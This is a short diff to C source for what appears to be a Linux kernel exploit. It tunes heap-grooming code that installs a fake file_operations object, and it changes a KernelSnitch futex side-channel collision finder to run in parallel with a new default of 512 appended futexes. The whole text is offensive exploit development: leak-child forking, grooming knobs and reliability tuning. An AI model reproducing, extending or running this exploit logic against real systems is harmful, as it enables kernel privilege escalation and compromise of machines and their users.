@@ -64,6 +64,7 @@ static long groom_env_long_clamped(const char *name, long fallback, long lo,
 #define OSS_MM_PARTIALS 5
 #define OSS_KSNITCH_COLLISIONS 4
 #define OSS_KSNITCH_REPEAT 64
+#define OSS_KSNITCH_APPENDED_DEFAULT 512
 #define OSS_SKB_RECLAIM_SENDS 64
 #define OSS_SKB_RECLAIM_MIN_FULL 48
 #define OSS_RECLAIM_QUIET_SAMPLE_MS 25
@@ -106,8 +107,8 @@ static pid_t clone_leak_child(void) {
     if (getppid() == 1) {
       _exit(1);
     }
-    kernelsnitch_find_collisions(g_ks);
-    kernelsnitch_find_collisions(g_ks_verify);
+    kernelsnitch_find_collisions_parallel(g_ks);
+    kernelsnitch_find_collisions_parallel(g_ks_verify);
     _exit(0);
   }
   return child;
@@ -401,10 +402,11 @@ static uint64_t groom_and_install_fops_object_impl(
     goto cleanup;
   }
   {
-    /* Experiment knobs; defaults preserve the closed profile. Repeat is
-     * bounded by average (>=8) and the fixed __times[] size (<=128). */
+    /* Keep the established repeat count. The smaller waiter pile was
+     * measured in the isolated AFZH3 collision benchmark. */
     long ks_appended = groom_env_long_clamped(
-        "KSNITCH_APPENDED", (long)g_ks->appended_futexes, 256, APPENDED_FUTEXES);
+        "KSNITCH_APPENDED", OSS_KSNITCH_APPENDED_DEFAULT, 256,
+        APPENDED_FUTEXES);
     long ks_repeat = groom_env_long_clamped(
         "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT, OSS_KSNITCH_REPEAT,
         REPEAT_MEASUREMENT);
